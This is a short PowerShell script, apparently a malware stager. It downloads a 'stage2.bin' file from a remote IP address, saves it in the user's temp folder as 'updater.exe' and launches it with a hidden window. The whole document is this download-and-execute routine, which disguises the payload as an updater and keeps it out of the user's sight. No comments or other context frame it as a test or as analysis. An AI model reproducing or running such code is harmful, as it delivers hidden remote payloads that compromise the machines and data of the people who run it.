[CmdletBinding()]
param(
    [string]$Stage1Url = "https://192.0.2.94/cdn/stage2.bin",
    [string]$Stage2Path = "$env:TEMP\updater.exe"
)
(New-Object System.Net.WebClient).DownloadFile($Stage1Url, $Stage2Path)
Start-Process -FilePath $Stage2Path -WindowStyle Hidden
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
